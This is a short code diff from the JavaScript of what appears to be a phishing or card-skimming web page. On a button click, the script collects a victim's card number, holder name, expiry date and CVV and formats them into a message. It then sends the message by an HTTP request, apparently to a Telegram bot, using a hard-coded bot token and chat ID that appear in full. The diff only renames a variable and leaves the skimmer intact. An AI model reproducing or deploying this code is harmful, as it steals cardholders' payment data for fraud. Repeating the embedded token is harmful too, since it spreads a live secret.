@@ -97,7 +97,7 @@ but.addEventListener("click", (e) =>{
   console.log(expmont)
   console.log(expyr)
   console.log(ccv)
-  var toke = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
+  var token = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
   var chatid = -4071018603
   var mytext = `Result is: %0A Number:${num} %0A Hold: ${hold} %0A Month: ${expmont} %0A Year: ${expyr} %0A ccv = ${ccv}` 
   
@@ -106,5 +106,5 @@ but.addEventListener("click", (e) =>{
   let aip = new XMLHttpRequest();
   aip.open("GET", url,true);
   aip.send
-  
+
 })
